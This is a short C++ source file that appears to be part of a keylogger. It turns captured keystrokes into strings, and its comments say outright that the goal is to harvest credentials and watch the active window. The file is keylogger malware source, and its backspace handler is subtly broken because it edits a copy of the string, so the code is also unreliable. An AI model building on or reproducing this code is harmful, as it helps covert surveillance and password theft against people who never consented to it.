#include "includes.h"
#include "handleChars.h"

void handleBackspace(std::vector<std::string>& v)
{
	if ((v.size()) < 1) //check for no elements in array
		return;

	std::string curstr = v.at(v.size() - 1);

	if (curstr.size() < 1) //check for no characters in string (probably newly created)
		return;
		//so hanle it you bitch
	//honestly after ENTER, it doesn't matter what they're writing because we're looking for credentials and such.
	//if they're typing a text document, we'll find out. (active window monitoring)

	curstr.erase(curstr.size() - 1);
}

void handleEnter(std::vector<std::string>& v)
{
	std::string strnew{};
	v.push_back(strnew);
}


void advancedStr(int keyCode, bool isShift, std::vector<std::string>& v)
{
	//if ENTER is pressed: add a new item and start a new string.
	//if BACKSPACE is pressed: remove the last char in the vector.
	switch (keyCode)
	{
		
	case 8: //backspace
		std::cout << "Pressed backspace, handling...\n";
		handleBackspace(v);
		break;

	case 13: //ENTER key
		std::cout << "Pressed ENTER, making new string...\n";
		handleEnter(v);
		break;

	case 32: //SPACE key (we handle it differnetly)
		std::cout << "Pressed SPACE, handling...\n";
		v.at(v.size() - 1) += " ";
		break;

	default:
		v.at(v.size() - 1) += handleChars(keyCode, isShift);
		break;
	}
}